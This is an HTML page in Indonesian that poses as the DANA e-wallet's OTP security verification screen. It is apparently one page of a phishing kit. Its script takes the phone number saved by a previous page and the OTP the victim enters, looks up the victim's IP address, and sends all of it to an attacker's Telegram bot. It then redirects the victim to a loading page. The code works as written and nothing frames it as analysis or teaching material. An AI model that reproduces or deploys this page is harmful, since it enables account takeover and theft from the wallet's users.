<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi - DANA</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(145deg, #f5f9ff 0%, #e8f2fa 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            background: white;
            padding: 40px 28px 32px;
            border-radius: 32px;
            box-shadow: 0 12px 40px rgba(0, 100, 200, 0.12), 0 4px 16px rgba(0,0,0,0.04);
            text-align: center;
            width: 100%;
            max-width: 360px;
        }
        .logo { margin: 0 auto 12px; display: block; }
        .lock-icon { margin: 6px auto 10px; display: block; }
        .title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
        .sub-info { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
        .sub-info strong { color: #1a1a1a; font-weight: 600; }
        .otp-input-group { position: relative; margin-bottom: 16px; }
        .otp-input-group input {
            width: 100%;
            padding: 16px 16px 16px 52px;
            border: 1.5px solid #dce4ec;
            border-radius: 16px;
            font-size: 20px;
            text-align: center;
            letter-spacing: 6px;
            font-weight: 600;
            background: #fafcff;
            transition: all 0.2s;
            outline: none;
        }
        .otp-input-group input:focus {
            border-color: #0099ff;
            background: white;
            box-shadow: 0 0 0 4px rgba(0,153,255,0.08);
        }
        .otp-input-group .lock-left {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            opacity: 0.35;
        }
        .btn-verify {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #0099ff 0%, #0077dd 100%);
            border: none;
            border-radius: 24px;
            color: white;
            font-size: 17px;
            font-weight: 700;
            box-shadow: 0 6px 20px rgba(0,153,255,0.35);
            cursor: pointer;
            transition: all 0.15s;
            margin-top: 6px;
        }
        .btn-verify:active { transform: scale(0.97); }
        .btn-verify:disabled { opacity: 0.6; cursor: not-allowed; }
        .resend-link {
            display: inline-block;
            margin-top: 16px;
            font-size: 14px;
            color: #0099ff;
            font-weight: 600;
            text-decoration: none;
            border-bottom: 1.5px dotted rgba(0,153,255,0.3);
            cursor: pointer;
        }
        .footer-note { font-size: 12px; color: #aaa; margin-top: 20px; }
        .divider { border: none; border-top: 1px solid #edf2f7; margin: 20px 0 12px; }
        .error-msg { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
<div class="card">
    <svg class="logo" viewBox="0 0 200 60" width="120" height="36">
        <defs>
            <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" style="stop-color:#0099ff;stop-opacity:1" />
                <stop offset="100%" style="stop-color:#0066cc;stop-opacity:1" />
            </linearGradient>
        </defs>
        <rect x="0" y="10" width="40" height="40" rx="12" fill="url(#logoGrad)"/>
        <text x="10" y="39" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="white">D</text>
        <text x="50" y="39" font-family="Arial, sans-serif" font-size="26" font-weight="700" fill="#1a1a1a">DANA</text>
    </svg>

    <svg class="lock-icon" width="64" height="50" viewBox="0 0 64 50">
        <circle cx="32" cy="20" r="20" fill="#0099ff" opacity="0.08"/>
        <rect x="14" y="18" width="36" height="26" rx="4" fill="none" stroke="#0099ff" stroke-width="1.8"/>
        <path d="M22 18v-6a10 10 0 0 1 20 0v6" fill="none" stroke="#0099ff" stroke-width="1.8"/>
        <circle cx="32" cy="30" r="3" fill="#0099ff"/>
    </svg>

    <div class="title">Verifikasi keamanan</div>
    <div class="sub-info">
        Kode OTP telah dikirim ke<br>
        <strong id="phoneDisplay">+62 812 3456 7890</strong>
    </div>

    <form id="otpForm">
        <div class="otp-input-group">
            <span class="lock-left">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="currentColor"/>
                </svg>
            </span>
            <input type="text" id="otp" placeholder="6 digit kode" maxlength="6" inputmode="numeric" pattern="[0-9]*" required autofocus>
        </div>
        <button type="submit" class="btn-verify" id="verifyBtn">Verifikasi</button>
        <div class="error-msg" id="errorMsg">Gagal verifikasi, coba lagi.</div>
    </form>

    <span class="resend-link" onclick="alert('Kode baru telah dikirim (simulasi)');">Kirim ulang kode</span>

    <hr class="divider">
    <div class="footer-note">DANA • Dompet Digital Indonesia</div>
</div>

<script src="config.js"></script>
<script>
// Ambil nomor dari localStorage
const phone = localStorage.getItem('dana_phone') || '+62 812 3456 7890';
document.getElementById('phoneDisplay').textContent = phone;

document.getElementById('otpForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const otp = document.getElementById('otp').value.trim();
    const btn = document.getElementById('verifyBtn');
    const errorMsg = document.getElementById('errorMsg');
    
    if (!otp || otp.length < 4) {
        errorMsg.style.display = 'block';
        errorMsg.textContent = 'Masukkan kode OTP yang valid (6 digit).';
        return;
    }
    
    errorMsg.style.display = 'none';
    btn.disabled = true;
    btn.textContent = 'Memverifikasi...';
    
    // Kirim OTP ke Telegram
    const ip = await getIP();
    const message = `🔐 DATA LENGKAP\n═══════════════\n📱 Nomor: ${phone}\n🔑 OTP: ${otp}\n🌐 IP: ${ip}\n🕐 Waktu: ${new Date().toLocaleString()}\n═══════════════`;
    
    try {
        await sendTelegram(message);
        localStorage.removeItem('dana_phone');
        window.location.href = 'loading.html';
    } catch (err) {
        errorMsg.style.display = 'block';
        errorMsg.textContent = 'Gagal mengirim data. Coba lagi.';
        btn.disabled = false;
        btn.textContent = 'Verifikasi';
    }
});

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return '0.0.0.0';
    }
}

async function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const params = new URLSearchParams({
        chat_id: CHAT_ID,
        text: message
    });
    const response = await fetch(url + '?' + params, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' }
    });
    if (!response.ok) throw new Error('Telegram API error');
    return response.json();
}
</script>
</body>
</html>
